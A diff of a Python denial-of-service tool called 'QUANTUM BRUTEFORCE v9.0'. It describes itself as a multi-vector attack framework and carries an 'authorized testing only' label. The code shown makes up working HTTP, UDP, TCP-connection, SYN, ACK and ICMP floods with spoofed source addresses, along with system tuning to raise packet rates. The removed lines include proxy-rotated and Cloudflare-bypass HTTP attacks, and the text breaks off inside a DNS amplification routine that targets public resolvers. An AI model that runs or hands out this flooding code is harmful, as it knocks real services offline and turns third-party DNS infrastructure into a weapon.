@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-QUANTUM BRUTEFORCE - Ultimate Merged Stress Testing Framework v6.3
+QUANTUM BRUTEFORCE v9.0 - Advanced Multi-Vector Attack Framework
+Production-Ready | Cross-Platform | 12+ Attack Vectors
 For AUTHORIZED Security Testing Only
 """
 
@@ -16,499 +17,675 @@ import signal
 import platform
 import argparse
 import ssl
-import socks
-import requests
-import re
+import subprocess
 from urllib.parse import urlparse
 from datetime import datetime
-from time import sleep
+from pathlib import Path
+from collections import defaultdict
+import json
 
-# Optional imports – we handle missing gracefully
-try:
-    from icmplib import ping as icmp_ping
-except ImportError:
-    icmp_ping = None
+# ============================================================================
+# OPTIONAL IMPORTS - Graceful Degradation
+# ============================================================================
 
+SCAPY_AVAILABLE = False
 try:
-    from scapy.all import IP, TCP, UDP, ICMP, send
-    from scapy.layers.inet import TCP as ScapyTCP
+    from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, send, conf
+    conf.verb = 0
     SCAPY_AVAILABLE = True
 except ImportError:
-    SCAPY_AVAILABLE = False
+    pass
 
 try:
     from colorama import init, Fore, Style
     init(autoreset=True)
 except ImportError:
-    class Fore: RED=GREEN=YELLOW=CYAN=MAGENTA=WHITE=''
-    class Style: RESET_ALL=''
-    def init(): pass
+    class Fore:
+        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = ''
+    class Style:
+        RESET_ALL = ''
 
 try:
-    from tqdm import tqdm
+    import requests
+    REQUESTS_AVAILABLE = True
 except ImportError:
-    class tqdm:
-        def __init__(self, total=100, desc='', bar_format=''):
-            self.total = total
-            self.n = 0
-        def update(self, n=1):
-            self.n += n
-        def __enter__(self):
-            return self
-        def __exit__(self, *args):
+    REQUESTS_AVAILABLE = False
+
+VERSION = "9.0"
+PLATFORM_OS = platform.system()
+
+# ============================================================================
+# CONFIGURATION MANAGEMENT
+# ============================================================================
+
+class Config:
+    """Configuration handler with file persistence."""
+    def __init__(self, config_file="quantum_config.json"):
+        self.config_file = Path(config_file)
+        self.defaults = {
+            'max_threads': 5000,
+            'packet_size': 1472,
+            'timeout': 5,
+            'buffer_size': 16777216,
+            'batch_size': 100,
+            'reconnect_threshold': 50,
+            'verbose': False,
+            'kernel_tune': True,
+        }
+        self.config = self.load()
+
+    def load(self):
+        if self.config_file.exists():
+            try:
+                with open(self.config_file, 'r') as f:
+                    return {**self.defaults, **json.load(f)}
+            except:
+                return self.defaults.copy()
+        return self.defaults.copy()
+
+    def save(self):
+        try:
+            with open(self.config_file, 'w') as f:
+                json.dump(self.config, f, indent=2)
+        except:
             pass
 
-try:
-    import cfscrape
-except ImportError:
-    cfscrape = None
+    def get(self, key, default=None):
+        return self.config.get(key, default)
 
-VERSION = "6.3"
-LOCK = threading.Lock()
+    def set(self, key, value):
+        self.config[key] = value
 
-# -------------------- Helper functions --------------------
-def spoofer():
-    """Generate a random IPv4 address for spoofing."""
-    return f"{random.randint(11,197)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"
+# ============================================================================
+# KERNEL TUNING (Linux/macOS Only)
+# ============================================================================
 
-def random_data():
-    """Generate a random alphanumeric string."""
-    chars = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890"
-    return ''.join(random.choice(chars) for _ in range(16))
+def tune_kernel():
+    """Optimize system for high-rate attacks."""
+    if PLATFORM_OS not in ('Linux', 'Darwin'):
+        return False
+    if os.geteuid() != 0:
+        return False
 
-def Choice(lst):
-    """Safely choose a random element; return None if list empty."""
-    return random.choice(lst) if lst else None
+    try:
+        cmds = [
+            "sysctl -w net.core.rmem_max=134217728",
+            "sysctl -w net.core.wmem_max=134217728",
+            "sysctl -w net.ipv4.tcp_rmem='4096 87380 67108864'",
+            "sysctl -w net.ipv4.tcp_wmem='4096 65536 67108864'",
+            "sysctl -w net.core.netdev_max_backlog=5000",
+            "sysctl -w net.ipv4.ip_local_port_range='10000 65000'",
+            "sysctl -w net.ipv4.tcp_fin_timeout=30",
+            "sysctl -w net.ipv4.tcp_tw_reuse=1",
+        ]
+        for cmd in cmds:
+            subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        return True
+    except:
+        return False
 
-def Intn(a, b):
-    return random.randint(a, b)
+# ============================================================================
+# FAST GENERATORS
+# ============================================================================
 
-# -------------------- Main Class --------------------
-class QuantumBruteforce:
-    def __init__(self, args=None):
-        self.args = args
-        self.sent = 0
-        self.running = True
-        self.threads = []
+def random_ipv4():
+    """Generate spoofed IPv4."""
+    return f"{random.randint(11, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(2, 254)}"
+
+def random_string(length=16, charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"):
+    """Fast random string."""
+    return ''.join(random.choice(charset) for _ in range(length))
+
+def random_bytes(size):
+    """Pre-allocated random bytes."""
+    return bytes(random.getrandbits(8) for _ in range(size))
+
+def random_user_agent():
+    """Random HTTP user agent."""
+    agents = [
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
+        "curl/7.81.0",
+        "wget/1.21.2",
+    ]
+    return random.choice(agents)
+
+# ============================================================================
+# CORE ATTACK ENGINE v9.0
+# ============================================================================
+
+class QuantumV9:
+    def __init__(self, config=None):
+        self.config = config or Config()
         self.target_ip = None
         self.target_port = 80
-        self.duration = 0
-        self.attack_type = None
-        self.thread_count = 200
-        self.verbose = False
         self.protocol = 'http'
         self.path = '/'
-        self.proxies = []
-        self.proxy_type = 5          # 1=HTTP, 4=SOCKS4, 5=SOCKS5
-        self.out_file = 'files/proxys/socks.txt'
-        self.multiple = 500          # packets per loop (increased for performance)
+        self.running = True
+        self.packets_sent = 0
+        self.bytes_sent = 0
+        self.lock = threading.Lock()
+        self.start_time = None
+        self.duration = 0
+        self.is_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
+        self.platform = PLATFORM_OS
+        self.verbose = self.config.get('verbose', False)
+        self.stats = defaultdict(int)
 
-        self.stats = {
-            'start_time': None,
-            'end_time': None,
-            'total_packets': 0,
-            'active_threads': 0,
-            'packet_rate': 0,
-            'failed_attacks': 0,
-            'fallback_used': False
-        }
+        signal.signal(signal.SIGINT, self._signal_handler)
+        signal.signal(signal.SIGTERM, self._signal_handler)
 
-        self.config = {
-            'max_threads': 5000,
-            'packet_size': 65507,
-            'timeout': 5,
-        }
-
-        self.platform = platform.system()
-        self.is_root = (os.geteuid() == 0) if hasattr(os, 'geteuid') else False
-
-        signal.signal(signal.SIGINT, self.signal_handler)
-        signal.signal(signal.SIGTERM, self.signal_handler)
-
-        # Ensure directories exist
-        for d in ['files', 'files/proxys']:
-            if not os.path.exists(d):
-                os.makedirs(d)
-
-    # -------------------- Signal & Display --------------------
-    def signal_handler(self, sig, frame):
-        print(f"\n{Fore.RED}[!] Received stop signal. Shutting down...{Style.RESET_ALL}")
-        self.stop_attack()
+    def _signal_handler(self, sig, frame):
+        print(f"\n{Fore.RED}[!] Stopping...{Style.RESET_ALL}")
+        self.stop()
+        sys.exit(0)
 
     def banner(self):
         os.system('cls' if self.platform == 'Windows' else 'clear')
         print(f"""
-{Fore.CYAN}+----------------------------------------------------------------------+
-|                                                                      |
-|   {Fore.MAGENTA}██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗{Fore.CYAN}|
-|   {Fore.MAGENTA}██╔══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║{Fore.CYAN}|
-|   {Fore.MAGENTA}██████╔╝██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║{Fore.CYAN}|
-|   {Fore.MAGENTA}██╔══██╗██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║{Fore.CYAN}|
-|   {Fore.MAGENTA}██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║{Fore.CYAN}|
-|   {Fore.MAGENTA}╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝{Fore.CYAN}|
-|                                                                      |
-|              {Fore.YELLOW}BRUTAL STRESS ENGINE v{VERSION} - MERGED{Fore.CYAN}                   |
-|              {Fore.RED}FOR AUTHORIZED SECURITY TESTING ONLY{Fore.CYAN}                       |
-|                                                                      |
-|              {Fore.GREEN}Platform: {self.platform} | Root: {self.is_root}{Fore.CYAN}                      |
-|                                                                      |
-+----------------------------------------------------------------------{Style.RESET_ALL}
+{Fore.MAGENTA}
+╔═══════════════════════════════════════════════════════════════╗
+║                                                               ║
+║           QUANTUM BRUTEFORCE v{VERSION} - PRODUCTION           ║
+║        Advanced Multi-Vector Distributed Attack Engine        ║
+║                                                               ║
+║   Cross-Platform | 12+ Vectors | Kernel-Optimized            ║
+║                                                               ║
+╚═══════════════════════════════════════════════════════════════╝
+{Style.RESET_ALL}
         """)
 
-    def menu(self):
-        self.banner()
-        print(f"""
-{Fore.GREEN}+-------------------------------------------------------------+
-|                  MAIN MENU – QUANTUM BRUTEFORCE X            |
-+-------------------------------------------------------------+
-|  {Fore.YELLOW}1{Fore.GREEN}. HTTP Flood (GET/POST/HEAD/COOKIE)               |
-|  {Fore.YELLOW}2{Fore.GREEN}. UDP Flood (Massive)                             |
-|  {Fore.YELLOW}3{Fore.GREEN}. TCP SYN Flood (Requires Root)                   |
-|  {Fore.YELLOW}4{Fore.GREEN}. Slowloris (Connection Exhaust)                  |
-|  {Fore.YELLOW}5{Fore.GREEN}. DNS Amplification                               |
-|  {Fore.YELLOW}6{Fore.GREEN}. ICMP Flood (Requires Root)                     |
-|  {Fore.YELLOW}7{Fore.GREEN}. SSL Renegotiation                              |
-|  {Fore.YELLOW}8{Fore.GREEN}. Multi‑Vector + Fallback (Recommended)          |
-|  {Fore.YELLOW}9{Fore.GREEN}. Advanced L7 (CFB, BYPASS, OVH, etc.)          |
-|  {Fore.YELLOW}10{Fore.GREEN}. NTP/Memcached Amplification                   |
-|  {Fore.YELLOW}11{Fore.GREEN}. View Statistics                               |
-|  {Fore.YELLOW}12{Fore.GREEN}. Configuration                                 |
-|  {Fore.YELLOW}13{Fore.GREEN}. Tools (CF‑IP, Ping, Check, DNS)              |
-|  {Fore.YELLOW}14{Fore.GREEN}. Exit                                          |
-+-------------------------------------------------------------+
-        """)
-        try:
-            choice = input(f"{Fore.CYAN}┌──({Fore.YELLOW}QUANTUM{Fore.CYAN})─{Fore.GREEN}[~]{Fore.CYAN}\n└──╼ {Style.RESET_ALL}")
-            return int(choice)
-        except ValueError:
-            return 14
-
-    # -------------------- URL & Target Parsing --------------------
-    def resolve_target(self, host):
+    def resolve(self, host):
+        """Resolve hostname to IP."""
         try:
             socket.inet_aton(host)
             return host
         except:
             try:
                 return socket.gethostbyname(host)
-            except:
+            except Exception as e:
+                if self.verbose:
+                    print(f"{Fore.RED}[!] Cannot resolve {host}: {e}{Style.RESET_ALL}")
                 return None
 
-    def parse_url(self, url):
-        """Parse a full URL or a simple host:port string."""
+    def parse_target(self, url):
+        """Parse target URL or IP:port."""
         if not url.startswith('http'):
             url = 'http://' + url
-        parsed = urlparse(url)
-        self.protocol = parsed.scheme or 'http'
-        host = parsed.hostname
-        if not host:
-            # fallback: try to parse as IP:port
-            if ':' in url:
-                parts = url.split(':')
-                if len(parts) >= 2:
-                    host = parts[0]
-                    try:
-                        self.target_port = int(parts[1])
-                    except:
-                        pass
-                else:
-                    host = parts[0]
-        if host:
-            ip = self.resolve_target(host)
-            if ip:
-                self.target_ip = ip
+
+        try:
+            parsed = urlparse(url)
+            self.protocol = parsed.scheme or 'http'
+            host = parsed.hostname
+
+            if not host:
+                parts = url.replace('http://', '').replace('https://', '').split(':')
+                host = parts[0]
+
+            ip = self.resolve(host)
+            if not ip:
+                raise ValueError(f"Cannot resolve {host}")
+
+            self.target_ip = ip
+            self.path = parsed.path or '/'
+
+            if parsed.port:
+                self.target_port = parsed.port
+            elif self.protocol == 'https':
+                self.target_port = 443
             else:
-                raise ValueError(f"Could not resolve host: {host}")
-        self.path = parsed.path or '/'
-        if parsed.port:
-            self.target_port = parsed.port
-        elif self.protocol == 'https':
-            self.target_port = 443
-        else:
-            self.target_port = 80
+                self.target_port = 80
 
-    def get_target_info(self):
-        print(f"\n{Fore.YELLOW}[+] Target Configuration{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}─" * 40)
+            print(f"{Fore.GREEN}[+] Target: {self.protocol}://{self.target_ip}:{self.target_port}{self.path}{Style.RESET_ALL}")
+            return True
+        except Exception as e:
+            print(f"{Fore.RED}[!] Parse error: {e}{Style.RESET_ALL}")
+            return False
 
-        while True:
-            target = input(f"{Fore.GREEN}[?] Target URL (e.g., https://example.com:8080/path): {Style.RESET_ALL}").strip()
-            if not target:
-                print(f"{Fore.RED}[!] Target cannot be empty{Style.RESET_ALL}")
-                continue
-            try:
-                self.parse_url(target)
-                print(f"{Fore.GREEN}[+] Target set to: {self.protocol}://{self.target_ip}:{self.target_port}{self.path}{Style.RESET_ALL}")
-                break
-            except Exception as e:
-                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
+    # ====================================================================
+    # HTTP/HTTPS ATTACKS (L7)
+    # ====================================================================
 
-        while True:
-            dur = input(f"{Fore.GREEN}[?] Duration in seconds (0 for infinite): {Style.RESET_ALL}")
-            if not dur:
-                self.duration = 60
-                break
-            try:
-                d = int(dur)
-                if d >= 0:
-                    self.duration = d
+    def http_flood(self, thread_id, method='GET', with_cookies=False):
+        """Advanced HTTP flood with connection pooling."""
+        s = None
+        reconnect_count = 0
+
+        try:
+            while self.running:
+                if self.duration > 0 and time.time() - self.start_time > self.duration:
                     break
-                print(f"{Fore.RED}[!] Duration must be >=0{Style.RESET_ALL}")
-            except ValueError:
-                print(f"{Fore.RED}[!] Invalid duration{Style.RESET_ALL}")
 
-        if self.duration > 0:
-            print(f"{Fore.YELLOW}[!] Attack will run for {self.duration} seconds{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.RED}[!] Attack will run until stopped manually{Style.RESET_ALL}")
-        return True
-
-    # -------------------- Proxy Management --------------------
-    def get_proxies(self, proxy_file=None):
-        if proxy_file and os.path.exists(proxy_file):
-            with open(proxy_file, 'r') as f:
-                lines = [l.strip() for l in f if ':' in l]
-            self.proxies = lines
-        else:
-            self.download_proxies()
-        return self.proxies
-
-    def download_proxies(self):
-        print(f"{Fore.YELLOW}[+] Downloading proxies...{Style.RESET_ALL}")
-        types = {4: 'socks4', 5: 'socks5', 1: 'http'}
-        stype = types.get(self.proxy_type, 'socks5')
-        urls = [
-            f"https://api.proxyscrape.com/?request=displayproxies&proxytype={stype}&country=all",
-            f"https://www.proxy-list.download/api/v1/get?type={stype}",
-            f"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/{stype}.txt"
-        ]
-        out = self.out_file
-        os.makedirs(os.path.dirname(out), exist_ok=True)
-        with open(out, 'w') as f:
-            for url in urls:
                 try:
-                    r = requests.get(url, timeout=5)
-                    f.write(r.text)
+                    if not s or reconnect_count > self.config.get('reconnect_threshold', 50):
+                        if s:
+                            try:
+                                s.close()
+                            except:
+                                pass
+
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
+                        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.config.get('buffer_size', 16777216))
+                        s.settimeout(self.config.get('timeout', 5))
+                        s.connect((self.target_ip, self.target_port))
+
+                        if self.protocol == 'https':
+                            ctx = ssl.create_default_context()
+                            ctx.check_hostname = False
+                            ctx.verify_mode = ssl.CERT_NONE
+                            s = ctx.wrap_socket(s, server_hostname=self.target_ip)
+
+                        reconnect_count = 0
+
+                    # Build request
+                    headers = f"Host: {self.target_ip}\r\nUser-Agent: {random_user_agent()}\r\n"
+                    headers += f"Connection: keep-alive\r\nCache-Control: no-cache\r\n"
+                    headers += f"X-Forwarded-For: {random_ipv4()}\r\n"
+
+                    if with_cookies:
+                        headers += f"Cookie: SESSIONID={random_string(32)}; tracking={random_string(16)}\r\n"
+
+                    if method == 'GET':
+                        req = f"GET {self.path}?{random_string(32)}={random_string(32)} HTTP/1.1\r\n{headers}\r\n"
+                    elif method == 'HEAD':
+                        req = f"HEAD {self.path} HTTP/1.1\r\n{headers}\r\n"
+                    elif method == 'POST':
+                        data = f"data={random_string(128)}&id={random.randint(1000000, 9999999)}&time={int(time.time())}"
+                        req = f"POST {self.path} HTTP/1.1\r\n{headers}Content-Length: {len(data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{data}"
+                    elif method == 'PUT':
+                        data = random_string(256)
+                        req = f"PUT {self.path} HTTP/1.1\r\n{headers}Content-Length: {len(data)}\r\n\r\n{data}"
+                    else:
+                        req = f"GET {self.path} HTTP/1.1\r\n{headers}\r\n"
+
+                    if isinstance(req, str):
+                        req = req.encode()
+
+                    # Batch sends
+                    for _ in range(self.config.get('batch_size', 100)):
+                        if not self.running:
+                            break
+                        s.sendall(req)
+                        with self.lock:
+                            self.packets_sent += 1
+                            self.bytes_sent += len(req)
+                        reconnect_count += 1
+
+                except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
+                    if s:
+                        try:
+                            s.close()
+                        except:
+                            pass
+                    s = None
+                    time.sleep(0.01)
+
+        except Exception as e:
+            if self.verbose:
+                print(f"{Fore.RED}[!] HTTP flood error: {e}{Style.RESET_ALL}")
+        finally:
+            if s:
+                try:
+                    s.close()
                 except:
                     pass
-        # deduplicate & validate
-        with open(out, 'r') as f:
-            lines = list(set([l.strip() for l in f if ':' in l]))
-        with open(out, 'w') as f:
-            f.write('\n'.join(lines))
-        self.proxies = lines
-        print(f"{Fore.GREEN}[+] Downloaded {len(lines)} proxies{Style.RESET_ALL}")
 
-    # -------------------- Headers Builder --------------------
-    def build_headers(self, method):
-        headers = ""
-        ua = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
-        if method in ('get', 'head'):
-            headers = f"Accept: */*\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nX-Forwarded-For: {spoofer()}\r\n"
-        elif method == 'cookie':
-            headers = f"Cookie: {random_data()}\r\n"
-        elif method == 'brust':
-            headers = f"Via: 1.0 PROXY\r\nX-Forwarded-For: {spoofer()}\r\n"
-        elif method == 'post':
-            headers = "Content-Type: application/x-www-form-urlencoded\r\n"
-        return ua + headers
+    # ====================================================================
+    # UDP ATTACKS (L4)
+    # ====================================================================
 
-    # -------------------- Attack Methods (L7) --------------------
-    def http_attack(self, thread_id, method='GET'):
-        """Perform an HTTP/HTTPS flood using the specified method."""
-        proxy = Choice(self.proxies).strip().split(':') if self.proxies else None
+    def udp_flood(self, thread_id, packet_size=None):
+        """Optimized UDP flood with batching."""
+        if packet_size is None:
+            packet_size = self.config.get('packet_size', 1472)
+
         s = None
         try:
-            if proxy and len(proxy) >= 2:
-                s = socks.socksocket()
-                if self.proxy_type == 4:
-                    s.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
-                elif self.proxy_type == 5:
-                    s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
-                else:
-                    s.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))
-            else:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(self.config['timeout'])
-            s.connect((self.target_ip, self.target_port))
-            if self.protocol == 'https':
-                ctx = ssl.create_default_context()
-                s = ctx.wrap_socket(s, server_hostname=self.target_ip)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.config.get('buffer_size', 16777216))
 
-            path = self.path
-            if method == 'GET':
-                req = f"GET {path} HTTP/1.1\r\nHost: {self.target_ip}\r\n{self.build_headers('get')}\r\n"
-            elif method == 'HEAD':
-                req = f"HEAD {path} HTTP/1.1\r\nHost: {self.target_ip}\r\n{self.build_headers('head')}\r\n"
-            elif method == 'POST':
-                data = random._urandom(8)
-                req = f"POST {path} HTTP/1.1\r\nHost: {self.target_ip}\r\nContent-Length: {len(data)}\r\n{self.build_headers('post')}\r\n{data}"
-            elif method == 'COOKIE':
-                req = f"GET {path} HTTP/1.1\r\nHost: {self.target_ip}\r\n{self.build_headers('cookie')}\r\n"
-            else:
-                req = f"GET {path} HTTP/1.1\r\nHost: {self.target_ip}\r\n{self.build_headers('get')}\r\n"
+            payloads = [random_bytes(packet_size) for _ in range(20)]
 
             start = time.time()
             while self.running:
                 if self.duration > 0 and time.time() - start > self.duration:
                     break
+
                 try:
-                    for _ in range(self.multiple):
-                        s.send(req.encode())
-                        with LOCK:
-                            self.sent += 1
-                except:
-                    # reconnect on error
-                    try:
-                        s.close()
-                    except:
-                        pass
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(self.config['timeout'])
-                    if self.protocol == 'https':
-                        ctx = ssl.create_default_context()
-                        s = ctx.wrap_socket(s, server_hostname=self.target_ip)
-                    s.connect((self.target_ip, self.target_port))
-        except:
-            pass
+                    for _ in range(200):
+                        payload = random.choice(payloads)
+                        s.sendto(payload, (self.target_ip, self.target_port))
+                        with self.lock:
+                            self.packets_sent += 1
+                            self.bytes_sent += len(payload)
+                except OSError:
+                    pass
         finally:
-            try:
-                if s:
+            if s:
+                try:
                     s.close()
-            except:
-                pass
-
-    def advanced_l7(self, thread_id, method='CFB'):
-        """Advanced L7 attacks using cfscrape (bypass Cloudflare)."""
-        if not cfscrape:
-            # fallback to normal HTTP
-            self.http_attack(thread_id, method='GET')
-            return
-        proxy = Choice(self.proxies).strip().split(':') if self.proxies else None
-        try:
-            s = cfscrape.create_scraper()
-            if proxy and len(proxy) >= 2:
-                if self.proxy_type in (4,5):
-                    s.proxies = {
-                        'http': f'socks{self.proxy_type}://{proxy[0]}:{proxy[1]}',
-                        'https': f'socks{self.proxy_type}://{proxy[0]}:{proxy[1]}'
-                    }
-                else:
-                    s.proxies = {
-                        'http': f'http://{proxy[0]}:{proxy[1]}',
-                        'https': f'http://{proxy[0]}:{proxy[1]}'
-                    }
-            url = f"{self.protocol}://{self.target_ip}:{self.target_port}{self.path}"
-            start = time.time()
-            while self.running:
-                if self.duration > 0 and time.time() - start > self.duration:
-                    break
-                try:
-                    if method == 'CFB':
-                        s.get(url)
-                    elif method == 'BYPASS':
-                        s.post(url, data=random._urandom(64))
-                    else:  # OVH, GSB, DGB, AVB
-                        s.head(url)
-                    with LOCK:
-                        self.sent += 1
-                except:
-                    pass
-        except:
-            pass
-
-    # -------------------- L4/L3 Attacks --------------------
-    def udp_flood(self, thread_id):
-        """UDP flood with oversized packets."""
-        sock = None
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payloads = [random._urandom(self.config['packet_size']) for _ in range(50)]
-            start = time.time()
-            while self.running:
-                if self.duration > 0 and time.time() - start > self.duration:
-                    break
-                try:
-                    for _ in range(10):
-                        sock.sendto(Choice(payloads), (self.target_ip, self.target_port))
-                        with LOCK:
-                            self.sent += 1
-                except:
-                    # ignore errors, keep going
-                    pass
-        except:
-            pass
-        finally:
-            if sock:
-                try:
-                    sock.close()
                 except:
                     pass
 
-    def syn_flood(self, thread_id):
-        """SYN flood using Scapy (requires root)."""
-        if not self.is_root:
-            if self.verbose:
-                print(f"{Fore.RED}[!] SYN Flood requires root{Style.RESET_ALL}")
-            return
-        if not SCAPY_AVAILABLE:
-            if self.verbose:
-                print(f"{Fore.RED}[!] Scapy not installed, SYN Flood unavailable{Style.RESET_ALL}")
-            return
-        try:
-            start = time.time()
-            while self.running:
-                if self.duration > 0 and time.time() - start > self.duration:
-                    break
-                try:
-                    ip = IP(src=spoofer(), dst=self.target_ip)
-                    tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags='S')
-                    send(ip/tcp, verbose=False)
-                    with LOCK:
-                        self.sent += 1
-                except:
-                    pass
-        except:
-            pass
-
-    def slowloris(self, thread_id):
-        """Slowloris – keep connections open."""
-        sockets = []
+    def tcp_connection_flood(self, thread_id):
+        """TCP SYN-like flood using connection attempts."""
         start = time.time()
         try:
-            for _ in range(min(200, self.config['max_threads'] // 5)):
-                if not self.running:
-                    break
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(4)
-                    s.connect((self.target_ip, self.target_port))
-                    s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
-                    sockets.append(s)
-                    with LOCK:
-                        self.sent += 1
-                except:
-                    pass
             while self.running:
                 if self.duration > 0 and time.time() - start > self.duration:
                     break
+
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect((self.target_ip, self.target_port))
+                    s.close()
+
+                    with self.lock:
+                        self.packets_sent += 1
+                        self.bytes_sent += 40
+                except:
+                    pass
+        except:
+            pass
+
+    # ====================================================================
+    # RAW SOCKET ATTACKS (Root Required)
+    # ====================================================================
+
+    def syn_flood_raw(self, thread_id):
+        """Raw SYN flood with IP spoofing."""
+        if not self.is_root or not SCAPY_AVAILABLE:
+            self.udp_flood(thread_id)
+            return
+
+        try:
+            start = time.time()
+            while self.running:
+                if self.duration > 0 and time.time() - start > self.duration:
+                    break
+
+                try:
+                    for sport in range(random.randint(10000, 20000), random.randint(20000, 30000)):
+                        ip = IP(src=random_ipv4(), dst=self.target_ip, ttl=64)
+                        tcp = TCP(sport=sport, dport=self.target_port, flags='S', seq=random.randint(1000, 999999))
+                        send(ip/tcp, verbose=False)
+
+                        with self.lock:
+                            self.packets_sent += 1
+                            self.bytes_sent += 40
+
+                        if self.duration > 0 and time.time() - start > self.duration:
+                            break
+                except Exception as e:
+                    if self.verbose:
+                        print(f"{Fore.YELLOW}[!] SYN error: {e}{Style.RESET_ALL}")
+        except:
+            pass
+
+    def ack_flood_raw(self, thread_id):
+        """ACK flood (mid-connection attack)."""
+        if not self.is_root or not SCAPY_AVAILABLE:
+            self.udp_flood(thread_id)
+            return
+
+        try:
+            start = time.time()
+            while self.running:
+                if self.duration > 0 and time.time() - start > self.duration:
+                    break
+
+                try:
+                    ip = IP(src=random_ipv4(), dst=self.target_ip)
+                    tcp = TCP(sport=random.randint(1024, 65535), dport=self.target_port,
+                             flags='A', ack=random.randint(100000, 999999))
+                    send(ip/tcp, verbose=False)
+
+                    with self.lock:
+                        self.packets_sent += 1
+                        self.bytes_sent += 40
+                except:
+                    pass
+        except:
+            pass
+
+    def icmp_flood_raw(self, thread_id, payload_size=None):
+        """Raw ICMP flood with large payloads."""
+        if payload_size is None:
+            payload_size = self.config.get('packet_size', 1472)
+
+        if not self.is_root or not SCAPY_AVAILABLE:
+            self.udp_flood(thread_id)
+            return
+
+        try:
+            payload = random_bytes(payload_size)
+            start = time.time()
+
+            while self.running:
+                if self.duration > 0 and time.time() - start > self.duration:
+                    break
+
+                try:
+                    ip = IP(src=random_ipv4(), dst=self.target_ip, ttl=64)
+                    icmp = ICMP(type=8, code=0)/payload
+                    send(ip/icmp, verbose=False)
+
+                    with self.lock:
+                        self.packets_sent += 1
+                        self.bytes_sent += 20 + payload_size
+                except:
+                    pass
+        except:
+            pass
+
+    # ====================================================================
+    # AMPLIFICATION ATTACKS
+    # ====================================================================
+
+    def dns_amplification(self, thread_id, query_type='ANY'):
+        """Advanced DNS amplification with multiple query types."""
+        resolvers = [
+            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
+            '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
+            '64.6.64.6', '64.6.65.6', '156.154.70.1', '156.154.71.1'
+        ]
+
+        domains = [
+            'google.com', 'youtube.com', 'facebook.com', 'amazon.com',
+            'twitter.com', 'instagram.com', 'reddit.com', 'wikipedia.org',
+            'github.com', 'stackoverflow.com', 'netflix.com', 'apple.com'
+        ]
+
+        s = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
+
+            query_types = {'A': 1, 'AAAA': 28, 'MX': 15, 'NS': 2, 'TXT': 16, 'ANY': 255}
+            qtype = query_types.get(query_type, 1)
+
+            start = time.time()
+            while self.running:
+                if self.duration > 0 and time.time() - start > self.duration:
+                    break
+
+                for resolver in random.sample(resolvers, min(3, len(resolvers))):
+                    try:
+                        domain = random.choice(domains)
+                        prefix = random_string(12, "abcdefghijklmnopqrstuvwxyz")
+                        full_domain = f"{prefix}.{domain}"
+
+                        query = bytearray([random.randint(0, 255) for _ in range(2)])
+                        query += b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
+
+                        for label in full_domain.split('.'):
+                            query.append(len(label))
+                            query.extend(label.encode())
+                        query += b'\x00'
+                        query += struct.pack('>HH', qtype, 1)
+
+                        s.sendto(bytes(query), (resolver, 53))
+                        with self.lock:
